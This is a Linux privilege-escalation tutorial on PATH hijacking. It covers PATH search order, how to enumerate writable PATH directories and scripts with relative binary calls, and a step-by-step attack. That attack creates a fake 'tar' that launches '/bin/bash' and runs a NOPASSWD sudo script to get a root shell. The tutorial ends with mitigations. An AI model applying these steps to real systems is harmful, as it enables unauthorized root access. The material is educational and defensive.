## Overview

`PATH` is an environment variable that defines which directories Linux searches when a command is executed.

Instead of typing the full absolute path to a binary:

```bash
/bin/cat /tmp/test.txt
```

we can simply type:

```bash
cat /tmp/test.txt
```

because `/bin` exists in the user's PATH.

Example PATH variable:

```bash
echo $PATH
```

```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Linux searches these directories **from left to right**.  
If two binaries share the same name, the first match found in PATH is executed.

This behaviour allows attackers to **hijack command execution** if:

- a writable directory appears in PATH
- PATH is misconfigured
- a script calls a binary without an absolute path
- the current directory `.` is included in PATH
- a privileged script runs a command that can be overridden

PATH abuse is essentially tricking Linux into running **our malicious binary instead of the legitimate one**.

---

# Why PATH Abuse Works

When a user executes a command, Linux:

1. reads the PATH variable
2. searches each directory in order
3. executes the first matching binary found

Example:

```bash
PATH=/usr/local/bin:/usr/bin:/bin
```

If a malicious binary named `ls` exists in `/usr/local/bin`, it will execute **before** `/bin/ls`.

PATH abuse becomes especially powerful when:

- a script runs as root
- a cron job runs commands without absolute paths
- a sudo rule allows execution of scripts
- writable directories exist in PATH
- PATH contains `.`
- environment variables are inherited improperly

---

# Checking the PATH Variable

Display PATH:

```bash
echo $PATH
```

or:

```bash
env | grep PATH
```

Example output:

```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Each directory is separated by a colon.

Search order is important.

Earlier directories take priority.

---

# Executables in PATH Directories

Any executable placed in a PATH directory can be run from anywhere.

Example:

```bash
pwd && conncheck
```

```text
/usr/local/sbin
Active Internet connections
```

Even when moving to another directory:

```bash
cd /tmp
conncheck
```

The binary still runs because `/usr/local/sbin` is part of PATH.

---

# Classic PATH Abuse Scenario

Suppose a script runs:

```bash
ls
```

instead of:

```bash
/bin/ls
```

If we can control PATH, we may be able to force the system to execute our malicious version of `ls`.

---

# Adding Current Directory to PATH

The dot (`.`) represents the current working directory.

If added to PATH:

```bash
PATH=.:$PATH
export PATH
```

Linux will check the current directory first when executing commands.

Check updated PATH:

```bash
echo $PATH
```

```text
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now Linux will execute binaries from the current directory before system binaries.

---

# Demonstration of PATH Abuse

Create a malicious script named `ls`:

```bash
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

Execute:

```bash
ls
```

Output:

```text
PATH ABUSE!!
```

Instead of listing files, our malicious script runs.

---

# Why This Matters for Privilege Escalation

PATH abuse becomes dangerous when:

- a root-owned script executes commands without absolute paths
- sudo allows execution of a script
- cron jobs execute commands from PATH
- environment variables are inherited insecurely

Example vulnerable script:

```bash
#!/bin/bash
backup.sh
tar -czf backup.tar.gz /home
```

If `tar` is called without `/bin/tar`, we may hijack execution by placing our own malicious `tar` earlier in PATH.

---

# Identifying PATH Abuse Opportunities

Check PATH:

```bash
echo $PATH
```

Look for:

- writable directories in PATH
- unusual directories
- relative paths
- current directory (`.`)
- directories owned by low-privileged users

Example:

```bash
/usr/local/bin:/home/user/scripts:/usr/bin:/bin
```

If `/home/user/scripts` is writable, it may be exploitable.

Check permissions:

```bash
ls -ld /home/user/scripts
```

---

# Searching for Writable PATH Directories

Identify writable directories inside PATH:

```bash
for dir in $(echo $PATH | tr ":" " "); do
    ls -ld $dir
done
```

Check for:

```text
drwxrwxr-x user user /home/user/scripts
```

Writable directories are high-value targets.

---

# Finding Scripts That Use Relative Paths

Look for scripts that call binaries without full paths:

```bash
grep -R "tar " /opt /usr/local 2>/dev/null
grep -R "cp " /opt /usr/local 2>/dev/null
grep -R "python " /opt /usr/local 2>/dev/null
```

Scripts owned by root but writable by others are especially interesting.

Search for scripts:

```bash
find / -type f -name "*.sh" 2>/dev/null
```

# Common Targets for PATH Hijacking

Commands often used in scripts:

- ls
- cp
- mv
- cat
- chmod
- chown
- tar
- gzip
- find
- bash
- sh
- python
- perl
- curl
- wget

If these commands are called without absolute paths, they may be replaceable.

# Example Attack Flow

### Step 1 – Identify script run as root

Example:

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD: /opt/scripts/backup.sh
```

---

### Step 2 – Inspect script

```bash
cat /opt/scripts/backup.sh
```

```bash
#!/bin/bash
tar -czf backup.tar.gz /home/user
```

Binary path not specified.

---

### Step 3 – Create malicious binary

```bash
echo '/bin/bash' > tar
chmod +x tar
```

---

### Step 4 – Modify PATH

```bash
PATH=.:$PATH
export PATH
```

---

### Step 5 – Execute script

```bash
sudo /opt/scripts/backup.sh
```

Root shell obtained.

---

# Defensive Misconfigurations That Enable PATH Abuse

Common causes:

### Relative binary calls

```bash
tar -czf backup.tar.gz
```

instead of:

```bash
/bin/tar -czf backup.tar.gz
```

---

### Writable directories in PATH

Example:

```bash
/home/user/bin
```

---

### PATH includes current directory

```bash
PATH=.:/usr/bin:/bin
```

---

### Custom scripts in writable locations

Example:

```bash
/usr/local/bin/custom_script
```

---

### Insecure sudo configurations

Example:

```bash
NOPASSWD scripts using relative paths
```

---

# Mitigation (Defensive Perspective)

Proper mitigation includes:

- using absolute paths in scripts
- restricting write permissions on PATH directories
- avoiding inclusion of `.`
- sanitising environment variables in sudo configuration
- limiting writable directories
- using secure PATH definitions for privileged scripts

# Key Takeaways

- PATH determines where Linux looks for executables.
- Earlier directories take precedence.
- Writable PATH directories create privilege escalation risk.
- Scripts that call binaries without absolute paths are vulnerable.
- Adding `.` to PATH allows execution of malicious binaries from the current directory.
- PATH abuse is commonly combined with sudo, cron, or SUID misconfigurations.
- Always check PATH during enumeration.
